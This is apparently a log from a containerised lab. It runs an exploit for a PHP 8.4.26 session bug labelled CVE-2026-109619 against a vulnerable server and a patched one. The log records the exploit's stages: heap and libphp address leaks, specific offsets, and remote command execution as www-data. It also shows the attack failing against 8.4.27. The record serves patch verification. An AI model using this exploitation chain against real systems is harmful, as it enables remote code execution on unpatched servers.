@@ -1,0 +1,150 @@
+ Image cve-2026-109619-attacker Building 
+#1 [internal] load local bake definitions
+#1 reading from stdin 702B done
+#1 DONE 0.0s
+
+#2 [internal] load build definition from Dockerfile
+#2 transferring dockerfile: 187B 0.0s done
+#2 DONE 0.0s
+
+#3 [internal] load metadata for docker.io/library/python:3.12-slim
+#3 DONE 1.0s
+
+#4 [internal] load .dockerignore
+#4 transferring context: 2B 0.0s done
+#4 DONE 0.0s
+
+#5 [1/4] FROM docker.io/library/python:3.12-slim@sha256:a0f57064cbdcd6285fa45f51237ab0b35ea8ebaed06a1f5973e89e19dfb86704
+#5 DONE 0.0s
+
+#6 [internal] load build context
+#6 transferring context: 19.40kB 0.0s done
+#6 DONE 0.0s
+
+#7 [2/4] WORKDIR /exploit
+#7 CACHED
+
+#8 [3/4] COPY exploit.py run_demo.sh ./
+#8 DONE 0.0s
+
+#9 [4/4] RUN chmod +x exploit.py run_demo.sh
+#9 DONE 0.5s
+
+#10 exporting to image
+#10 exporting layers 0.0s done
+#10 writing image sha256:68d4255d0e1d18e1c2d8fadabc7a2d052217d3a60de0d3c226c9b0711567a5dd done
+#10 naming to docker.io/library/cve-2026-109619-attacker done
+#10 DONE 0.0s
+
+#11 resolving provenance for metadata file
+#11 DONE 0.0s
+ Image cve-2026-109619-attacker Built 
+ Network cve-2026-109619_default Creating 
+ Network cve-2026-109619_default Creating 
+ Volume cve-2026-109619_proof-vuln Creating 
+ Volume cve-2026-109619_proof-vuln Creating 
+ Volume cve-2026-109619_proof-fixed Creating 
+ Volume cve-2026-109619_proof-fixed Creating 
+ Volume cve-2026-109619_proof-vuln Created 
+ Volume cve-2026-109619_proof-vuln Created 
+ Volume cve-2026-109619_proof-fixed Created 
+ Volume cve-2026-109619_proof-fixed Created 
+ Network cve-2026-109619_default Created 
+ Network cve-2026-109619_default Created 
+ Container cve-2026-109619-vuln-1 Creating 
+ Container cve-2026-109619-fixed-1 Creating 
+ Container cve-2026-109619-vuln-1 Created 
+ Container cve-2026-109619-fixed-1 Created 
+ Container cve-2026-109619-attacker-1 Creating 
+ Container cve-2026-109619-attacker-1 Created 
+Attaching to attacker-1, fixed-1, vuln-1
+ Container cve-2026-109619-fixed-1 Starting 
+ Container cve-2026-109619-vuln-1 Starting 
+ Container cve-2026-109619-fixed-1 Started 
+fixed-1  | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.2. Set the 'ServerName' directive globally to suppress this message
+fixed-1  | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.2. Set the 'ServerName' directive globally to suppress this message
+fixed-1  | [Fri Oct 23 05:04:04.419832 2026] [mpm_prefork:notice] [pid 1:tid 1] AH00163: Apache/2.4.69 (Debian) PHP/8.4.27 configured -- resuming normal operations
+fixed-1  | [Fri Oct 23 05:04:04.419877 2026] [core:notice] [pid 1:tid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
+ Container cve-2026-109619-vuln-1 Started 
+ Container cve-2026-109619-fixed-1 Waiting 
+ Container cve-2026-109619-vuln-1 Waiting 
+vuln-1   | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message
+vuln-1   | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message
+vuln-1   | [Fri Oct 23 05:04:05.129665 2026] [mpm_prefork:notice] [pid 1:tid 1] AH00163: Apache/2.4.69 (Debian) PHP/8.4.26 configured -- resuming normal operations
+vuln-1   | [Fri Oct 23 05:04:05.129704 2026] [core:notice] [pid 1:tid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
+ Container cve-2026-109619-fixed-1 Healthy 
+ Container cve-2026-109619-vuln-1 Healthy 
+ Container cve-2026-109619-attacker-1 Starting 
+attacker-1  | ==============================================================
+attacker-1  |  CVE-2026-109619 - PHP stale session global state -> RCE
+attacker-1  | ==============================================================
+attacker-1  | 
+attacker-1  | === 1/2  PHP 8.4.26 (vulnerable) ===
+ Container cve-2026-109619-attacker-1 Started 
+attacker-1  | [*] target http://vuln/index.php cmd='id>/out/p'
+attacker-1  | [*] offsets zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+attacker-1  | [*] rotating worker
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:08 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+vuln-1      | zend_mm_heap corrupted
+attacker-1  | [*] stage 1: heap leak (1/3)
+vuln-1      | [Fri Oct 23 05:04:09.133138 2026] [mpm_prefork:error] [pid 1:tid 1] AH00161: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting
+vuln-1      | [Fri Oct 23 05:04:09.133186 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 19 exit signal Abort (6)
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:10 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:10 +0000] "POST /index.php HTTP/1.1" 200 12257 "-" "-"
+attacker-1  | [+] Zend MM chunk base = 0x71ab23400000
+attacker-1  | [*] rotating worker
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:10 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+vuln-1      | zend_mm_heap corrupted
+vuln-1      | [Fri Oct 23 05:04:11.135164 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 34 exit signal Abort (6)
+attacker-1  | [*] stage 2: libphp leak (1/3)
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:12 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:12 +0000] "POST /index.php HTTP/1.1" 200 853 "-" "-"
+attacker-1  | [+] libphp base = 0x71ab25137000
+attacker-1  | [*] rotating worker
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:12 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+vuln-1      | zend_mm_heap corrupted
+vuln-1      | [Fri Oct 23 05:04:13.138101 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 42 exit signal Abort (6)
+attacker-1  | [*] stage 3: HTDATA=0x71ab234690d8 zif_system=0x71ab2559c370
+vuln-1      | 172.18.0.4 - - [23/Oct/2026:05:04:14 +0000] "POST /index.php HTTP/1.1" 200 367 "-" "-"
+vuln-1      | [Fri Oct 23 05:04:15.140063 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 50 exit signal Segmentation fault (11)
+attacker-1  | [+] executed on attempt 1
+attacker-1  | PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+attacker-1  | 
+attacker-1  | === 2/2  PHP 8.4.27 (patched) ===
+attacker-1  | [*] target http://fixed/index.php cmd='id>/out/p'
+attacker-1  | [*] offsets zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+attacker-1  | [*] rotating worker
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:15 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:15 +0000] "POST /index.php HTTP/1.1" 200 259 "-" "-"
+attacker-1  | [*] stage 1: heap leak (1/2)
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:16 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:16 +0000] "POST /index.php HTTP/1.1" 200 259 "-" "-"
+attacker-1  | [*] rotating worker
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:16 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:16 +0000] "POST /index.php HTTP/1.1" 200 259 "-" "-"
+attacker-1  | [*] stage 1: heap leak (2/2)
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:17 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:17 +0000] "POST /index.php HTTP/1.1" 200 259 "-" "-"
+attacker-1  | [*] rotating worker
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:17 +0000] "POST /index.php HTTP/1.1" 200 693 "-" "-"
+fixed-1     | 172.18.0.4 - - [23/Oct/2026:05:04:17 +0000] "POST /index.php HTTP/1.1" 200 259 "-" "-"
+attacker-1  | [-] heap leak failed
+attacker-1  | 
+attacker-1  | ==============================================================
+attacker-1  |  RESULT: CONFIRMED
+attacker-1  |    PHP 8.4.26: code execution as the Apache worker
+attacker-1  |    PHP 8.4.27: no code execution (patched)
+attacker-1  | ==============================================================
+attacker-1 exited with code 0
+ Compose Stopping Aborting on container exit...
+ Container cve-2026-109619-attacker-1 Stopping 
+ Container cve-2026-109619-attacker-1 Stopped 
+ Container cve-2026-109619-vuln-1 Stopping 
+ Container cve-2026-109619-fixed-1 Stopping 
+fixed-1     | [Fri Oct 23 05:04:18.667137 2026] [mpm_prefork:notice] [pid 1:tid 1] AH00170: caught SIGWINCH, shutting down gracefully
+vuln-1      | [Fri Oct 23 05:04:18.667059 2026] [mpm_prefork:notice] [pid 1:tid 1] AH00170: caught SIGWINCH, shutting down gracefully
+ Container cve-2026-109619-vuln-1 Stopped 
+vuln-1 exited with code 0
+ Container cve-2026-109619-fixed-1 Stopped 
+fixed-1 exited with code 0
+COMPOSE_EXIT_CODE=0
